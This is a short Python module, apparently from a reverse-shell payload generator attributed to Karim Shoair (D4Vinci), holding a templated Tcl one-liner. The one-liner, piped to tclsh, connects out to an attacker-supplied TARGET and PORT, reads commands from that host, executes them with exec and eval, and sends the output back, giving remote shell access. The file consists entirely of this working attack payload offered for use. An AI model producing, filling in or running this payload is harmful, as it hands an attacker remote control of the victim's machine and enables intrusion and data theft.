class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple reverse shell using tclsh interpreter."
    function    = "reverse shell"
    liner       = """echo 'set VAR1 [socket TARGET [expr PORT]];while NUM1 {puts -nonewline $VAR1 "shell>";flush $VAR1;gets $VAR1 VAR2;set VAR3 "exec $VAR2";if {![catch {set VAR4 [eval $VAR3]} err]} {puts $VAR1 $VAR4};flush $VAR1;};close $VAR1;'|tclsh"""
